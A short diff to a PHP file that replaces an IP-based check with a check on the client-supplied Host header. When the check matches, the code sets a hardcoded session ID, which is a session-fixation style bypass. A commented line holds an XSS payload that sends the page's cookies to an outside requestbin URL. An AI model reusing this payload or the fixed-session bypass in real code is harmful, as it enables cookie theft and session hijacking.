@@ -1,8 +1,6 @@
 <?php
-echo $_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_X_FORWARDED_FOR'];
-if(($_SERVER['REMOTE_ADDR']=='::1') and isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
+if(strstr($_SERVER['HTTP_HOST'], '11.0')){
 	session_id ('ohohcbi3njoueJ3su6slefl4g');
-	echo 'local';
 }
 
 //"<script>document.write(\'<img src=\"http://requestbin.fullcontact.com/1ap2jla1?cookie==\'+document.cookie+\'\">aaaa</img>\');</script>"
